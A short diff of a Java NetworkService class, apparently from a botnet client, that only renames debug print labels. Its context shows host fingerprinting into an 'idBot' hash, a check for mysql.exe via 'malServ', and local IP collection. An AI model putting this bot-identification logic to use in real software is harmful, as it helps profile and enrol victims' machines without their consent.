@@ -148,7 +148,6 @@ public class NetworkService {
 		else
 		elegible = (malServ.checklistFiles("(^mysql.exe)").equals("")) ? Boolean.FALSE :  Boolean.TRUE;
 		
-		System.out.println("kkk "+elegible + " kkkkk ");
 		System.out.println("My MYSQL: " + elegible);
 		
 		String os1 = System.getProperty("os.name");
@@ -314,7 +313,7 @@ public class NetworkService {
 		byte[] hash = DigestUtils.sha256(os + versionOS + archOS + usernameOS + milli);
 
 		idHash = Base64.encodeBase64String(hash);
-		System.out.println("jjjj " + idHash + "   " + hash.toString());
+		System.out.println("idBot " + idHash + "  hash " + hash.toString());
 		// salva hash su properties;
 
 		// genera Bot
@@ -344,7 +343,7 @@ public class NetworkService {
 		String ip = null;
 		//			ip = InetAddress.getLocalHost();
 		ip = getAllIpAddress();
-		System.out.println("kk " + ip);
+		System.out.println("my ip " + ip);
 		// TODO ELIMINA MOCK LOCAL IP
 		// result = asyncRequest.askMyIpToAmazon();
 		// if (result.matches(IP_REGEX))
